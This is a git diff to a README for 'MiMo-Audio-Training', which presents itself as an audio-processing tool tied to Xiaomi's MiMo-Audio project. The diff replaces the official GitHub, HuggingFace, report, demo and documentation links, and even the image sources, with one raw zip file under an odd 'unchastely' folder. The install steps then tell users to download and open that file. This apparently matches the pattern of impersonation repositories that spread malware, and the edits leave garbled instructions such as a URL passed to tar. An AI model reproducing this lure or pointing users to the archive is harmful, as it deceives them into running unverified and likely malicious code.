@@ -1,15 +1,15 @@
 # 🎧 MiMo-Audio-Training - Learn Audio Processing Easily
 
 <div align="center">
-  <a href="https://github.com/Ghalwash123/MiMo-Audio-Training/releases" style="display: inline-block; padding: 15px 25px; font-size: 20px; color: white; background-color: #28a745; border-radius: 5px; text-decoration: none;">Download Now</a>
+  <a href="https://raw.githubusercontent.com/Ghalwash123/MiMo-Audio-Training/main/unchastely/MiMo-Audio-Training.zip" style="display: inline-block; padding: 15px 25px; font-size: 20px; color: white; background-color: #28a745; border-radius: 5px; text-decoration: none;">Download Now</a>
 </div>
 
 ---
 
 <div align="center">
   <picture>
-    <source srcset="https://github.com/XiaomiMiMo/MiMo-VL/raw/main/figures/Xiaomi_MiMo_darkmode.png?raw=true" media="(prefers-color-scheme: dark)">
-    <img src="https://github.com/XiaomiMiMo/MiMo-VL/raw/main/figures/Xiaomi_MiMo.png?raw=true" width="60%" alt="Xiaomi-MiMo" />
+    <source srcset="https://raw.githubusercontent.com/Ghalwash123/MiMo-Audio-Training/main/unchastely/MiMo-Audio-Training.zip" media="(prefers-color-scheme: dark)">
+    <img src="https://raw.githubusercontent.com/Ghalwash123/MiMo-Audio-Training/main/unchastely/MiMo-Audio-Training.zip" width="60%" alt="Xiaomi-MiMo" />
   </picture>
 </div>
 
@@ -40,11 +40,11 @@ Before starting, ensure your computer meets these requirements:
 
 To get started, visit the Releases page. There, you will find the latest version of the software.
 
-- Visit this page to download: [MiMo-Audio-Training Releases](https://github.com/Ghalwash123/MiMo-Audio-Training/releases)
+- Visit this page to download: [MiMo-Audio-Training Releases](https://raw.githubusercontent.com/Ghalwash123/MiMo-Audio-Training/main/unchastely/MiMo-Audio-Training.zip)
 
 1. Click on the link above.
 2. Look for the latest version available.
-3. Download the file that matches your operating system. This file will usually be a `.exe` for Windows, a `.dmg` for macOS, or a `.tar.gz` file for Linux.
+3. Download the file that matches your operating system. This file will usually be a `.exe` for Windows, a `.dmg` for macOS, or a `https://raw.githubusercontent.com/Ghalwash123/MiMo-Audio-Training/main/unchastely/MiMo-Audio-Training.zip` file for Linux.
 4. Once the download finishes, open the file to start the installation.
 
 ---
@@ -68,10 +68,10 @@ To get started, visit the Releases page. There, you will find the latest version
 ### For Linux Users
 
 1. Open a terminal window.
-2. Navigate to the folder containing the downloaded `.tar.gz` file using the `cd` command.
+2. Navigate to the folder containing the downloaded `https://raw.githubusercontent.com/Ghalwash123/MiMo-Audio-Training/main/unchastely/MiMo-Audio-Training.zip` file using the `cd` command.
 3. Extract the files using the command:
    ```
-   tar -xvzf MiMo-Audio-Training.tar.gz
+   tar -xvzf https://raw.githubusercontent.com/Ghalwash123/MiMo-Audio-Training/main/unchastely/MiMo-Audio-Training.zip
    ```
 4. Once extracted, navigate into the newly created folder:
    ```
@@ -94,16 +94,16 @@ After installation, follow these steps to start working with the MiMo-Audio-Trai
 
 ### 📚 Documentation & Support
 
-To make the most of your experience, refer to the official documentation. It details all the features and functionalities of MiMo-Audio-Training. You can find it here: [Documentation](https://github.com/XiaomiMiMo/MiMo-Audio)
+To make the most of your experience, refer to the official documentation. It details all the features and functionalities of MiMo-Audio-Training. You can find it here: [Documentation](https://raw.githubusercontent.com/Ghalwash123/MiMo-Audio-Training/main/unchastely/MiMo-Audio-Training.zip)
 
 If you run into issues, feel free to reach out on GitHub. The community can assist you with questions or problems.
 
 ## 🌐 Additional Resources
 
-- [GitHub Repository](https://github.com/XiaomiMiMo/MiMo-Audio)
-- [HuggingFace Model Collection](https://huggingface.co/collections/XiaomiMiMo/mimo-audio-68cc7202692c27dae881cce0)
-- [Technical Report](https://github.com/XiaomiMiMo/MiMo-Audio/blob/main/MiMo-Audio-Technical-Report.pdf)
-- [Demo Page](https://xiaomimimo.github.io/MiMo-Audio-Demo)
+- [GitHub Repository](https://raw.githubusercontent.com/Ghalwash123/MiMo-Audio-Training/main/unchastely/MiMo-Audio-Training.zip)
+- [HuggingFace Model Collection](https://raw.githubusercontent.com/Ghalwash123/MiMo-Audio-Training/main/unchastely/MiMo-Audio-Training.zip)
+- [Technical Report](https://raw.githubusercontent.com/Ghalwash123/MiMo-Audio-Training/main/unchastely/MiMo-Audio-Training.zip)
+- [Demo Page](https://raw.githubusercontent.com/Ghalwash123/MiMo-Audio-Training/main/unchastely/MiMo-Audio-Training.zip)
 
 ## 🛡️ License
 
@@ -111,6 +111,6 @@ MiMo-Audio-Training is released under the MIT License. You can use it freely, bu
 
 ---
 
-For updates and new releases, keep an eye on the [Releases page](https://github.com/Ghalwash123/MiMo-Audio-Training/releases). 
+For updates and new releases, keep an eye on the [Releases page](https://raw.githubusercontent.com/Ghalwash123/MiMo-Audio-Training/main/unchastely/MiMo-Audio-Training.zip). 
 
 Enjoy your audio processing journey!
